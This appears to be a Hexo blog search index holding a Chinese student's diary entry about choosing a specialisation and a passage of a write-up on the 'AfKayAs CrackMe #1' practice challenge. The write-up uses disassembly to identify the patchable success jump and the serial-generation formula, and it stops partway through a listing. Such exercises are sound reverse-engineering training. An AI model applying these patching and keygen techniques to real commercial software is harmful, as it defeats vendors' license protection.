<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>20190525</title>
      <link href="/2019/05/25/20190525/"/>
      <url>/2019/05/25/20190525/</url>
      
        <content type="html"><![CDATA[<blockquote><p>颓了好长时间了，赶工做各种实验，学校不给钱去南京，考试，上课，天气升温……耽误了将近一个月了。</p></blockquote><p>大三分方向的事情决定下来了，报了物联网方向，另外两个方向是数字媒体和云计算。物联网大概是有21人报名，数字媒体大概也有30人左右，剩下的同学就都去了云计算……分方向这个事让我挺无语的，今年没限制各个方向的报名人数，报了就能去。就我身边的情况而言，报数字媒体（游戏）的同学基本都是真心喜欢的，报物联网的也都是对嵌入式、对计算机体系结构有兴趣的，只有云计算，绝大多数人报这个方向是因为随主流，甚至还有想报物联网的同学，觉得物联网人数太少最终选择了云计算的……除了从众心理报了云计算的，剩下的基本是把云计算当作一个就业热点或听说课程比较水而选择的，而并非是出于兴趣原因。</p><p>私以为，大学生还是要有主见为好。</p><p>读书笔记大概率要搁置一段时间了，感觉自己还是没找到记这类笔记的合适的方法，现在回头看之前的笔记，尤其是RE4B的笔记，感觉是为了记而记，没什么意思。而且RE4B、加密解密、自我修养、CSAPP这几本书都是穿插着看，期间遇到考试实验要中断好久。</p><p>感觉很长一段时间以来，自己都是以打比赛为动力学习，路走偏了。喜欢逆向，研究逆向长时间没有丝毫进步，是现在的问题所在。决定最近一段时间，到暑假为止，把学习逆向的时间全部转移回到学习基础知识上。</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 乱七八糟 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AfKayAs CrackMe #1</title>
      <link href="/2019/05/08/AfKayAs-CrackMe-1/"/>
      <url>/2019/05/08/AfKayAs-CrackMe-1/</url>
      
        <content type="html"><![CDATA[<p><a href="Afkayas.1.Exe">这道题</a>在win10运行时需要先下载VB的<a href="msvbvm50.exe">运行环境</a>。</p><p>题目一打开就是输入框，没有开头需要跳过的弹窗了。</p><p>先运行一下，随便输入点东西，得到如下结果：</p><p><img src="/2019/05/08/AfKayAs-CrackMe-1/1.png" alt="pic"></p><p>根据关键字下断（输入为123和456）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">0040258B | <span class="number">74</span> <span class="number">58</span>                    | <span class="keyword">je</span> afkayas<span class="meta">.1</span><span class="meta">.4025E5</span>                            | 关键跳</span><br><span class="line"><span class="number">0040258D</span> | <span class="number">68</span> <span class="number">80</span> <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B80                          | 401B80:L<span class="string">"You Get It"</span></span><br><span class="line"><span class="number">00402592</span> | <span class="number">68</span> 9C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B9C                          | 401B9C:L<span class="string">"\r\n"</span></span><br><span class="line"><span class="number">00402597</span> | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">00402599</span> | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040259B | <span class="number">8D</span> <span class="number">4D</span> E8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">0040259E | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004025A0 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025A1 | <span class="number">68</span> A8 <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401BA8                          | 401BA8:L<span class="string">"KeyGen It Now"</span></span><br><span class="line">004025A6 | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004025A8 | <span class="number">8D</span> <span class="number">4D</span> <span class="number">94</span>                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-6C]                  |</span><br><span class="line">004025AB | <span class="number">89</span> <span class="number">45</span> CC                 | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">34</span>],<span class="built_in">eax</span>                  |</span><br><span class="line">004025AE | <span class="number">8D</span> <span class="number">55</span> A4                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-5C]                  |</span><br><span class="line">004025B1 | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">004025B2 | <span class="number">8D</span> <span class="number">45</span> B4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-4C]                  |</span><br><span class="line">004025B5 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004025B6 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025B7 | <span class="number">8D</span> <span class="number">4D</span> C4                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C]                  |</span><br><span class="line">004025BA | 6A <span class="number">00</span>                    | <span class="keyword">push</span> <span class="number">0</span>                                         |</span><br><span class="line">004025BC | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">004025BD | C7 <span class="number">45</span> C4 <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>     | <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C],<span class="number">8</span>                    |</span><br><span class="line">004025C4 | FF <span class="number">15</span> <span class="number">10</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;rtcMsgBox&gt;]               |</span><br><span class="line">004025CA | <span class="number">8D</span> <span class="number">4D</span> E8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">004025CD | FF <span class="number">15</span> <span class="number">80</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaFreeStr&gt;]             |</span><br><span class="line">004025D3 | <span class="number">8D</span> <span class="number">55</span> <span class="number">94</span>                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-6C]                  |</span><br><span class="line">004025D6 | <span class="number">8D</span> <span class="number">45</span> A4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-5C]                  |</span><br><span class="line">004025D9 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004025DA | <span class="number">8D</span> <span class="number">4D</span> B4                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-4C]                  |</span><br><span class="line">004025<span class="built_in">DD</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025DE | <span class="number">8D</span> <span class="number">55</span> C4                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-3C]                  |</span><br><span class="line">004025E1 | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">004025E2 | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004025E3 | EB <span class="number">56</span>                    | <span class="keyword">jmp</span> afkayas<span class="meta">.1</span>.40263B                           |</span><br><span class="line">004025E5 | <span class="number">68</span> C8 <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401BC8                          | 401BC8:L<span class="string">"You Get Wrong"</span></span><br><span class="line">004025EA | <span class="number">68</span> 9C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B9C                          | 401B9C:L<span class="string">"\r\n"</span></span><br><span class="line">004025EF | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004025F1 | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025F3 | <span class="number">8D</span> <span class="number">4D</span> E8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">004025F6 | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004025F8 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004025F9 | <span class="number">68</span> E8 <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401BE8                          | 401BE8:L<span class="string">"Try Again"</span></span><br><span class="line">004025FE | FF D7                    | <span class="keyword">call</span> <span class="built_in">edi</span>                                       |</span><br></pre></td></tr></table></figure><p>可以看到40258B处为控制正确错误信息的跳转，爆破的话改这里就好了。回到注册算法分析上，向上找几个函数：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00402415</span> | FF <span class="number">15</span> E4 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaLenBstr&gt;]             | get length</span><br><span class="line">0040241B | 8B F8                    | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">0040241D</span> | 8B <span class="number">4D</span> E8                 | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402420</span> | <span class="number">69</span> FF FB 7C <span class="number">01</span> <span class="number">00</span>        | <span class="keyword">imul</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>,17CFB                             | len * <span class="number">0x17cfb</span></span><br><span class="line"><span class="number">00402426</span> | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line"><span class="number">00402427</span> | 0F <span class="number">80</span> <span class="number">91</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">jo</span> afkayas<span class="meta">.1</span>.4026BE                            |</span><br><span class="line"><span class="number">0040242D</span> | FF <span class="number">15</span> F8 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;rtcAnsiValueBstr&gt;]        | 得到首字母</span><br><span class="line"><span class="number">00402433</span> | 0F BF D0                 | <span class="keyword">movsx</span> <span class="built_in">edx</span>,<span class="built_in">ax</span>                                   |</span><br><span class="line"><span class="number">00402436</span> | <span class="number">03</span> FA                    | <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">edx</span>                                    | 得到 len * <span class="number">0x17cfb</span> + 首字母</span><br><span class="line"><span class="number">00402438</span> | 0F <span class="number">80</span> <span class="number">80</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">jo</span> afkayas<span class="meta">.1</span>.4026BE                            |</span><br><span class="line">0040243E | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">0040243F | FF <span class="number">15</span> E0 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrI4&gt;]               | 运算结果转为十进制数的字符串格式</span><br><span class="line"><span class="number">00402445</span> | 8B D0                    | <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402447</span> | <span class="number">8D</span> <span class="number">4D</span> E0                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]                  |</span><br><span class="line">0040244A | FF <span class="number">15</span> <span class="number">70</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaStrMove&gt;]             |</span><br><span class="line"><span class="number">00402450</span> | 8B BD <span class="number">50</span> FF FF FF        | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-B0]                  |</span><br><span class="line"><span class="number">00402456</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402457</span> | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">00402458</span> | FF <span class="number">93</span> A4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+A4]                     |</span><br><span class="line">0040245E | <span class="number">85</span> C0                    | <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                   | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402460</span> | <span class="number">7D</span> <span class="number">12</span>                    | <span class="keyword">jge</span> afkayas<span class="meta">.1</span><span class="meta">.402474</span>                           |</span><br><span class="line"><span class="number">00402462</span> | <span class="number">68</span> A4 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">push</span> A4                                        |</span><br><span class="line"><span class="number">00402467</span> | <span class="number">68</span> 5C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B5C                          |</span><br><span class="line">0040246C | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line"><span class="number">0040246D</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040246E | FF <span class="number">15</span> <span class="number">04</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaHresultCheckObj&gt;]     |</span><br><span class="line"><span class="number">00402474</span> | <span class="number">8D</span> <span class="number">45</span> E0                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]                  |</span><br><span class="line"><span class="number">00402477</span> | <span class="number">8D</span> <span class="number">4D</span> E4                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C]                  | [<span class="built_in">ebp</span>-1C]:L<span class="string">"123"</span></span><br><span class="line">0040247A | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">0040247B | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">0040247E | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line">0040247F | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line"><span class="number">00402480</span> | 6A <span class="number">03</span>                    | <span class="keyword">push</span> <span class="number">3</span>                                         |</span><br><span class="line"><span class="number">00402482</span> | FF <span class="number">15</span> 5C <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaFreeStrList&gt;]         |</span><br><span class="line"><span class="number">00402488</span> | <span class="number">83</span> C4 <span class="number">10</span>                 | <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">10</span>                                     |</span><br><span class="line">0040248B | <span class="number">8D</span> <span class="number">45</span> D4                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-2C]                  |</span><br><span class="line">0040248E | <span class="number">8D</span> <span class="number">4D</span> D8                 | <span class="keyword">lea</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">28</span>]                  |</span><br><span class="line"><span class="number">00402491</span> | <span class="number">8D</span> <span class="number">55</span> DC                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">24</span>]                  |</span><br><span class="line"><span class="number">00402494</span> | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line"><span class="number">00402495</span> | <span class="number">51</span>                       | <span class="keyword">push</span> <span class="built_in">ecx</span>                                       |</span><br><span class="line"><span class="number">00402496</span> | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line"><span class="number">00402497</span> | 6A <span class="number">03</span>                    | <span class="keyword">push</span> <span class="number">3</span>                                         |</span><br><span class="line"><span class="number">00402499</span> | FF <span class="number">15</span> F4 <span class="number">40</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaFreeObjList&gt;]         |</span><br><span class="line">0040249F | 8B <span class="number">06</span>                    | <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]                     | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024A1 | <span class="number">83</span> C4 <span class="number">10</span>                 | <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">10</span>                                     |</span><br><span class="line">004024A4 | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line">004024A5 | FF <span class="number">90</span> <span class="number">04</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">304</span>]                    |</span><br><span class="line">004024AB | 8B <span class="number">1D</span> 0C <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaObjSet&gt;]           |</span><br><span class="line">004024B1 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024B2 | <span class="number">8D</span> <span class="number">45</span> DC                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">24</span>]                  |</span><br><span class="line">004024B5 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024B6 | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004024B8 | 8B F8                    | <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024BA | <span class="number">8D</span> <span class="number">55</span> E8                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">18</span>]                  | [<span class="built_in">ebp</span>-<span class="number">18</span>]:L<span class="string">"123"</span></span><br><span class="line">004024BD | <span class="number">52</span>                       | <span class="keyword">push</span> <span class="built_in">edx</span>                                       |</span><br><span class="line">004024BE | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004024BF | 8B 0F                    | <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]                     |</span><br><span class="line">004024C1 | FF <span class="number">91</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+A0]                     |</span><br><span class="line">004024C7 | <span class="number">85</span> C0                    | <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>                                   | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024C9 | <span class="number">7D</span> <span class="number">12</span>                    | <span class="keyword">jge</span> afkayas<span class="meta">.1</span>.4024<span class="built_in">DD</span>                           |</span><br><span class="line">004024CB | <span class="number">68</span> A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           | <span class="keyword">push</span> A0                                        |</span><br><span class="line">004024D0 | <span class="number">68</span> 5C <span class="number">1B</span> <span class="number">40</span> <span class="number">00</span>           | <span class="keyword">push</span> afkayas<span class="meta">.1</span>.401B5C                          |</span><br><span class="line">004024D5 | <span class="number">57</span>                       | <span class="keyword">push</span> <span class="built_in">edi</span>                                       |</span><br><span class="line">004024D6 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024D7 | FF <span class="number">15</span> <span class="number">04</span> <span class="number">41</span> <span class="number">40</span> <span class="number">00</span>        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[&lt;&amp;_vbaHresultCheckObj&gt;]     |</span><br><span class="line">004024<span class="built_in">DD</span> | <span class="number">56</span>                       | <span class="keyword">push</span> <span class="built_in">esi</span>                                       |</span><br><span class="line">004024DE | FF <span class="number">95</span> <span class="number">40</span> FF FF FF        | <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-C0]                     | [<span class="built_in">ebp</span>-C0]:&amp;<span class="string">"牪l"</span></span><br><span class="line">004024E4 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024E5 | <span class="number">8D</span> <span class="number">45</span> D8                 | <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">28</span>]                  |</span><br><span class="line">004024E8 | <span class="number">50</span>                       | <span class="keyword">push</span> <span class="built_in">eax</span>                                       | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024E9 | FF D3                    | <span class="keyword">call</span> <span class="built_in">ebx</span>                                       |</span><br><span class="line">004024EB | 8B F0                    | <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span>                                    | <span class="built_in">eax</span>:L<span class="string">"123"</span></span><br><span class="line">004024ED | <span class="number">8D</span> <span class="number">55</span> E4                 | <span class="keyword">lea</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C]                  | 